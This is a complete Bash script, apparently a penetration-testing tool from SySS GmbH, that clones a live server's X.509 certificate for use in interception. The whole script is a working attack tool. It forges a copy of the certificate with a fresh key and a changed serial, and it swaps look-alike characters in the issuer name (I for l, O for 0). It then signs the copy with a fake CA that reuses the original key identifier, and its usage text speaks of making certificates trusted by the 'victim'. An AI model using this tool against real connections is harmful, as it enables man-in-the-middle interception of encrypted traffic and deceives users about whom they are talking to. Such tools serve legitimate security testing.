#!/bin/bash
# Adrian Vollmer, SySS GmbH 2017-2019
# Reference:
# https://security.stackexchange.com/questions/127095/manually-walking-through-the-signature-validation-of-a-certificate
#
# MIT License
#
# Copyright (c) 2017-2019 Adrian Vollmer, SySS GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.

set -e

DIR="/tmp"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
DEBUG=false

function usage(){
cat <<EOF
Usage: $0 [options] [<sni>@]<host>:<port>|<pem-file>
(Author: Adrian Vollmer, SySS GmbH 2017-2019)

Clone an X509 certificate. The cloned certificate and the corresponding key
will be located in <DIR>. Their filenames make up the output of this script.
openssl>=1.1.1 is required.

The mandatory argument can either be the path of an x509 certifcate in PEM
format, or a host name and a port number separated by a colon. Optionally, you
can precede this by a servername and an '@' if you want to specify the name
of the virtual host via SNI.

Optional parameters:

    -d=<DIR>, --directory=<DIR>:
        The directory in which to save the certificates and keys (default: /tmp)

    -r, --reuse-keys:
        Reuse previously generated suitable keys located in <DIR> for better
        performance

    -c=<CERT>, --cert=<CERT>:
        The path to a certificate in PEM format with which to sign the host
        certificate. The result will then not be cloned (i.e. seem fields
        will be different, in particular the issuer), but it will be a valid
        certificate which will be trusted by the victim if they trust
        <CERT>. You must supply a matching <KEY>.

    -k=<KEY>, --key=<KEY>:
        The path to a key in PEM format matching <CERT>

    --debug:
        Print debug messages

    -h, --help:
        Print this message and quit

EOF
}

if [ "$1" = "" ] ; then
    usage
    exit 1
fi

ISSUER_CERT=""
ISSUER_KEY=""
REUSE_KEYS=false
for i in "$@" ; do
    case $i in
            -d=*|--directory=*)
            DIR="${i#*=}"
            shift # past argument=value
        ;;
            -c=*|--cert=*)
            ISSUER_CERT="${i#*=}"
            shift # past argument=value
        ;;
            -k=*|--key=*)
            ISSUER_KEY="${i#*=}"
            shift # past argument=value
        ;;
            -r|--reuse-keys)
            REUSE_KEYS=true
            shift # past argument=value
        ;;
            --debug)
            DEBUG=true
            shift # past argument=value
            # set -x
        ;;
            -h|--help)
            usage
            exit 0
        ;;
            -*)
            echo "Unknown option: $i"
            exit 1
        ;;
        *)
            break      # unknown option
        ;;
    esac
done

# set some variables
HOST="$1"
mkdir -p "$DIR"

EC_PARAMS=$(cat <<'END_HEREDOC'
-----BEGIN EC PARAMETERS-----
MIIBogIBATBMBgcqhkjOPQEBAkEAqt2duNvpxIs/1OauM8n8B8swjbOzydIO1mOc
ynAzCHF9TZsAm8ZoQq7NoSrmo4DmKIH/Ly2CxoUoqmBWWDpI8zCBhARAqt2duNvp
xIs/1OauM8n8B8swjbOzydIO1mOcynAzCHF9TZsAm8ZoQq7NoSrmo4DmKIH/Ly2C
xoUoqmBWWDpI8ARAfLu8+UQc+rduGJDkaITq4yH3DAvLSYFSeJdQS+w+NqYrzfoj
BJdlQPZFAIXy2uFFwiVTtGV2NokYDqJXGGdCPgSBgQRkDs5cEniHF7nBugbLwqb+
uoWEJFjFbd6dsXWNOcAxPYK6UXNc2z6kmap3p9aUOmT3o/Jf4m8GtRuqJpb6kDXa
W1NL1ZX1rw+iyJI3bISs4btOMBm3FjTAETEVnK4DzunZkyGEvu8ha9cd8trfhqYn
MG7P+W27i6zhmLYeAPizMgJBAKrdnbjb6cSLP9TmrjPJ/AfLMI2zs8nSDtZjnMpw
MwhwVT5cQUypJhlBhmEZf6wQRx2x04EIXdrdtYeWgpypAGkCAQE=
-----END EC PARAMETERS-----
END_HEREDOC
)


set -u

if [[ -f "$HOST" ]] ; then
    CERTNAME="$(basename "$HOST")"
else
    CERTNAME="$HOST"
    SNI="${HOST%%@*}"
    if [ ! $SNI = $HOST ] ; then
        HOST="${HOST##*@}"
    fi
fi
rm -f "$DIR/${CERTNAME}_"*

function die () {
    echo "$1" >&2
    exit 1
}

function debug () {
    if [ $DEBUG = true ] ; then
        echo "$1" >&2
    fi
}

function generate_rsa_key () {
    # create new RSA private/public key pair (re-use private key if applicable)
    local KEY_LEN="$1"
    local MY_PRIV_KEY="$2"
    local NEW_MODULUS=""

    if [[ $REUSE_KEYS = true ]] && [[ -f "$DIR/RSA_$KEY_LEN" ]] ; then
        debug "Reusing RSA key"
        cp "$DIR/RSA_$KEY_LEN" "$MY_PRIV_KEY"
    else
        debug "Generating RSA key"
        openssl genrsa -out "$MY_PRIV_KEY" "$KEY_LEN" 2> /dev/null
        cp "$MY_PRIV_KEY" "$DIR/RSA_$KEY_LEN"
    fi

    NEW_MODULUS="$(openssl rsa -in "$MY_PRIV_KEY" -pubout 2> /dev/null \
        | openssl rsa -pubin -noout -modulus \
        | sed 's/Modulus=//' | tr "[:upper:]" "[:lower:]" )"
    printf "%s" "$NEW_MODULUS"
}

function generate_ec_key () {
    # create new EC private/public key pair (re-use private key if applicable)
    local EC_PARAM_NAME="$1"
    local MY_PRIV_KEY="$2"

    if [[ $REUSE_KEYS = true ]] && [[ -f "$DIR/EC" ]] ; then
        debug "Reusing EC key"
        cp "$DIR/EC" "$MY_PRIV_KEY"
    else
        debug "Generating EC key"
        openssl ecparam -name $EC_PARAM_NAME -genkey -out "$MY_PRIV_KEY" 2> /dev/null
        cp "$MY_PRIV_KEY" "$DIR/EC"
    fi

    offset="$(openssl ec -in "$MY_PRIV_KEY" 2> /dev/null \
        | openssl asn1parse \
        | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/')"
    NEW_MODULUS="$(openssl ec -in "$MY_PRIV_KEY" 2> /dev/null \
        | openssl asn1parse -offset $offset -noout \
            -out >(dd bs=1 skip=2 2> /dev/null | hexlify))"

    printf "%s" "$NEW_MODULUS"
}

function parse_certs () {
    # read the output of s_client via stdin and clone each cert
    # from https://stackoverflow.com/questions/45243785/script-wrapper-for-openssl-which-will-download-an-entire-certificate-chain-and
    nl=$'\n'

    state=begin
    counter=0
    while IFS= read -r line ; do
        case "$state;$line" in
          "begin;-----BEGIN CERTIFICATE-----" )
            # A certificate is about to begin!
            state=reading
            current_cert="$line"
            ;;

          "reading;-----END CERTIFICATE-----" )
            # Last line of a cert; save it and get ready for the next
            current_cert+="${current_cert:+$nl}$line"

            # ...and save it
            if [ ! -z "$current_cert" ] ; then
                printf "%s" "$current_cert" > "$DIR/${CERTNAME}_$counter"
            else
                echo "Error while parsing certificate" >&2
                exit 1
            fi
            counter=$((counter+=1))

            state=begin
            current_cert=""
            ;;

          "reading;"* )
            # Otherwise, it's a normal part of a cert; accumulate it to be
            # written out when we see the end
            current_cert+="$nl$line"
            ;;
        esac
    done
}

function oid() {
    # https://bugzil.la/1064636
    case "$1" in
        # "300d06092a864886f70d0101020500")
        # ;;md2WithRSAEncryption
        "300b06092a864886f70d01010b") echo sha256
        ;;#sha256WithRSAEncryption
        "300b06092a864886f70d010105") echo sha1
        ;;#sha1WithRSAEncryption
        "300d06092a864886f70d01010c0500") echo sha384
        ;;#sha384WithRSAEncryption
        "300a06082a8648ce3d040303") echo sha384
        ;;#ecdsa-with-SHA384
        "300a06082a8648ce3d040302") echo sha256
        ;;#ecdsa-with-SHA256
        "300d06092a864886f70d0101040500") echo md5
        ;;#md5WithRSAEncryption
        "300d06092a864886f70d01010d0500") echo sha512
        ;;#sha512WithRSAEncryption
        "300d06092a864886f70d01010b0500") echo sha256
        ;;#sha256WithRSAEncryption
        "300d06092a864886f70d0101050500") echo sha1
        ;;#sha1WithRSAEncryption
        *) echo "Unknow Hash Algorithm OID: $1" >&2
            exit 1
        ;;
    esac
}


function hexlify(){
    xxd -p | tr -d '\n'
}

function unhexlify(){
    xxd -p -r
}

function asn1-bitstring(){
    # https://docs.microsoft.com/en-us/windows/desktop/seccertenroll/about-bit-string
    data=$1
    len=$((${#data}/2+1))
    if [ $len -le 127 ] ; then
        len=$(printf "%02x" $len)
    else
        if [ $len -lt 256 ] ; then
            len=$(printf "81%02x" $len)
        else
            len=$(printf "82%04x" $len)
        fi
    fi
    printf "03%s00%s" $len $data
}

function extract-values () {
    # extract all the values we need from the original cert
    SUBJECT="$(openssl x509 -in "$CERT" -noout -subject \
        | sed 's/.* CN = //g')"
    ISSUER="$(openssl x509 -in "$CERT" -noout -issuer \
        | sed 's/.* CN = //g')"
    ISSUER_DN="$(openssl x509 -in "$CERT" -noout -issuer -nameopt compat \
        | sed 's/^issuer=//')"
    SUBJECT_DN="$(openssl x509 -in "$CERT" -noout -subject -nameopt compat \
        | sed 's/^subject=//')"

    if [[ ! $ISSUER_DN =~ ^/ ]] ; then # openssl < 1.1.1
        debug "Fixing DNs because OpenSSL version is under 1.1.1"
        ISSUER_DN="$(echo "/$ISSUER_DN" | sed 's/, /\//g')"
        SUBJECT_DN="$(echo "/$SUBJECT_DN" | sed 's/, /\//g')"
    fi

    SELF_SIGNED=false
    [[ $ISSUER_DN = $SUBJECT_DN ]] && SELF_SIGNED=true
    debug "self-signed: $SELF_SIGNED"

    SERIAL="$(openssl x509 -in "$CERT" -noout -serial \
        | sed 's/serial=//g' | tr '[A-F]' '[a-f]')"

    AUTH_KEY_IDENTIFIER="$(openssl asn1parse -in "$CERT" \
        | grep -A1 ":X509v3 Authority Key Identifier" | tail -n1 \
        | sed 's/.*\[HEX DUMP\]://' \
        | sed 's/^.\{8\}//')"
    debug "Original AuthKeyIdentifier: $AUTH_KEY_IDENTIFIER"
}

function create-fake-CA () {
    openssl req -x509 -new -nodes -days 1024 -sha256 \
        -subj "$NEW_ISSUER_DN" \
        -config <(cat /etc/ssl/openssl.cnf |sed "s/.*subjectKeyIdentifier.*=.*hash/subjectKeyIdentifier=$AUTH_KEY_IDENTIFIER/") \
        $@ \
        -out "$FAKE_ISSUER_CERT" 2> /dev/null
}

function clone_cert () {
    local CERT="$1"
    extract-values

    # if it is not self-signed and we have no compromised CA, change the
    # issuer or no browser will allow an exception.
    # it needs to stay the same length though.
    # also, the serial needs to be changed, because browsers keep track of
    # that.
    if [[ $SELF_SIGNED = false ]]; then
        if [[ $ISSUER =~ I ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/I/l/")
        elif [[ $ISSUER =~ l ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/l/I/")
        elif [[ $ISSUER =~ O ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/O/0/")
        elif [[ $ISSUER =~ 0 ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/0/O/")
        else
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/.$/ /")
        fi
        # avoid negative serial number
        # only change 16 hex digits in the middle
        NEW_SERIAL=$(openssl rand -hex 8)
        NEW_SERIAL=$(printf "%s" "$SERIAL" | sed "s/.\{16\}\(.\{4\}\)\$/$NEW_SERIAL\1/")
    else
        NEW_ISSUER=$ISSUER
        NEW_SERIAL=$SERIAL
    fi
    ISSUER=$(printf "%s" "$ISSUER" | hexlify)
    NEW_ISSUER=$(printf "%s" "$NEW_ISSUER" | hexlify)
    NEW_ISSUER_DN="$(printf "%s" "$ISSUER_DN" | hexlify | sed "s/$ISSUER/$NEW_ISSUER/" | unhexlify)"
    CLONED_CERT="${CERT}.cert"
    CLONED_KEY="${CERT}.key"
    FAKE_ISSUER_KEY="${CERT}.CA.key"
    FAKE_ISSUER_CERT="${CERT}.CA.cert"


    OLD_MODULUS="$(openssl x509 -in "$CERT" -modulus -noout \
        | sed -e 's/Modulus=//' | tr "[:upper:]" "[:lower:]")"
    if [[ $OLD_MODULUS = "wrong algorithm type" ]] ; then
        # it's EC and not RSA (or maybe DSA...)
        SCHEME=ec
        offset="$(openssl x509 -in "$CERT" -pubkey -noout 2> /dev/null \
            | openssl asn1parse \
            | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/')"
        OLD_MODULUS="$(openssl x509 -in "$CERT" -pubkey -noout 2> /dev/null \
            | openssl asn1parse -offset $offset -noout \
                -out >(dd bs=1 skip=2 2> /dev/null | hexlify))"
        EC_OID="$(openssl x509 -in "$CERT" -text -noout \
            | grep "ASN1 OID: " | sed 's/.*: //')"
        NEW_MODULUS="$(generate_ec_key "$EC_OID" "$CLONED_KEY")"
        if [[ $SELF_SIGNED = true ]] ; then
            FAKE_ISSUER_KEY="$CLONED_KEY"
            FAKE_ISSUER_CERT="$CLONED_CERT"
        else
            if [[ $REUSE_KEYS = true ]] && [[ -f "$DIR/EC" ]] ; then
                create-fake-CA -key "$DIR/EC"
                FAKE_ISSUER_KEY="$DIR/EC"
            else
                create-fake-CA -keyout "$FAKE_ISSUER_KEY"
            fi
        fi
    else
        SCHEME=rsa
        # get the key length of the public key
        KEY_LEN="$(openssl x509  -in "$CERT" -noout -text \
            | grep Public-Key: | grep -o "[0-9]\+")"
        NEW_MODULUS="$(generate_rsa_key "$KEY_LEN" "$CLONED_KEY")"
        if [[ $SELF_SIGNED = true ]] ; then
            FAKE_ISSUER_KEY="$CLONED_KEY"
            FAKE_ISSUER_CERT="$CLONED_CERT"
        else
            if [[ $REUSE_KEYS = true ]] && [[ -f "$DIR/RSA_2048" ]] ; then
                create-fake-CA -key "$DIR/RSA_2048"
                FAKE_ISSUER_KEY="$DIR/RSA_2048"
            else
                create-fake-CA -keyout "$FAKE_ISSUER_KEY"
            fi
        fi
    fi

    if [ ! -z "$ISSUER_CERT" -a ! -z "$ISSUER_KEY" ] ; then
        # sign it regularly with given cert
        FAKE_ISSUER_KEY="$ISSUER_KEY"
        FAKE_ISSUER_CERT="$ISSUER_CERT"
        openssl x509 -in "$CERT" -outform DER | hexlify \
            | sed "s/$OLD_MODULUS/$NEW_MODULUS/" \
            | unhexlify \
            | openssl x509 -days 356 -inform DER -CAkey "$ISSUER_KEY" \
                -CA "$ISSUER_CERT" -CAcreateserial \
                -out "$CLONED_CERT"  2> /dev/null
        return-result
    else
        if [ ! -z "$ISSUER_CERT" -o ! -z "$ISSUER_KEY" ] ; then
            die "If you provide one of <KEY> or <CERT>, you must also provide the other"
        fi
    fi


    # extract old signature
    offset="$(openssl asn1parse -in "$CERT" | grep SEQUENCE \
        | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
    SIGNING_ALGO="$(openssl asn1parse -in "$CERT" \
        -strparse $offset -noout -out >(hexlify))"
    offset="$(openssl asn1parse -in "$CERT" \
        | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
    OLD_SIGNATURE="$(openssl asn1parse -in "$CERT" \
        -strparse $offset -noout -out >(hexlify))"
    OLD_TBS_CERTIFICATE="$(openssl asn1parse -in "$CERT" \
        -strparse 4 -noout -out >(hexlify))"

    # create new signature
    NEW_TBS_CERTIFICATE="$(printf "%s" "$OLD_TBS_CERTIFICATE" \
        | sed "s/$ISSUER/$NEW_ISSUER/" \
        | sed "s/$SERIAL/$NEW_SERIAL/" \
        | sed "s/$OLD_MODULUS/$NEW_MODULUS/")"

    digest="$(oid "$SIGNING_ALGO")"
    NEW_SIGNATURE="$(printf "%s" "$NEW_TBS_CERTIFICATE" | unhexlify \
        | openssl $digest -sign "$FAKE_ISSUER_KEY" \
        | hexlify)"

    # replace signature, compute new asn1 length
    OLD_ASN1_SIG=$(asn1-bitstring $OLD_SIGNATURE)
    NEW_ASN1_SIG=$(asn1-bitstring $NEW_SIGNATURE)

    OLD_CERT_LENGTH="$(openssl x509 -in "$CERT" -outform der \
        | dd bs=2 skip=1 count=1 2> /dev/null | hexlify)"
    OLD_CERT_LENGTH=$((16#$OLD_CERT_LENGTH))
    NEW_CERT_LENGTH=$((OLD_CERT_LENGTH \
        -${#OLD_ASN1_SIG}/2+${#NEW_ASN1_SIG}/2 \
        ))
    OLD_CERT_LENGTH="$(printf "%04x" $OLD_CERT_LENGTH)"
    NEW_CERT_LENGTH="$(printf "%04x" $NEW_CERT_LENGTH)"

    openssl x509 -in "$CERT" -outform DER | hexlify \
        | sed "s/$OLD_MODULUS/$NEW_MODULUS/" \
        | sed "s/$ISSUER/$NEW_ISSUER/" \
        | sed "s/$SERIAL/$NEW_SERIAL/" \
        | sed "s/$OLD_ASN1_SIG/$NEW_ASN1_SIG/" \
        | sed "s/^\(....\)$OLD_CERT_LENGTH/\1$NEW_CERT_LENGTH/" \
        | unhexlify \
        | openssl x509 -inform DER -outform PEM > "$CLONED_CERT"

    if [ ! -s "$CLONED_CERT" ] ; then
        echo "Cloning failed" >&2
        rm "$CLONED_CERT"
        rm "$CLONED_KEY"
        exit 1
    fi
    return-result
}

function return-result () {
    sanity-check || ( rm -rf "$CLONED_KEY" "$CLONED_CERT" ; exit 1)
    printf "%s\n" "$CLONED_KEY"
    printf "%s\n" "$CLONED_CERT"
    exit 0
}

function sanity-check () {
    # check whether the key pair matches, and whether the cert validates
    debug "$(diff \
        <(openssl x509 -noout -text -in $CLONED_CERT) \
        <(openssl x509 -noout -text -in $CERT))"
    diff -q <(openssl x509 -in "$CLONED_CERT" -pubkey -noout 2> /dev/null ) \
        <(openssl $SCHEME -in "$CLONED_KEY" -pubout 2> /dev/null) \
        || ( echo Key mismatch, probably due to a bug >&2; return 1 )
    openssl verify -CAfile "$FAKE_ISSUER_CERT" "$CLONED_CERT" > /dev/null \
        || ( echo Verification failed, probably due to a bug >&2; return 1 )
}

function main () {
    if [[ -f "$HOST" ]] ; then
        clone_cert "$HOST"
    else
        # save all certificates in chain
        openssl s_client -servername "$SNI" \
            -verify 5 \
            -showcerts -connect "$HOST" < /dev/null 2>/dev/null | \
             parse_certs
        # clone the host cert
        clone_cert "$DIR/${CERTNAME}_0"
    fi
}

main
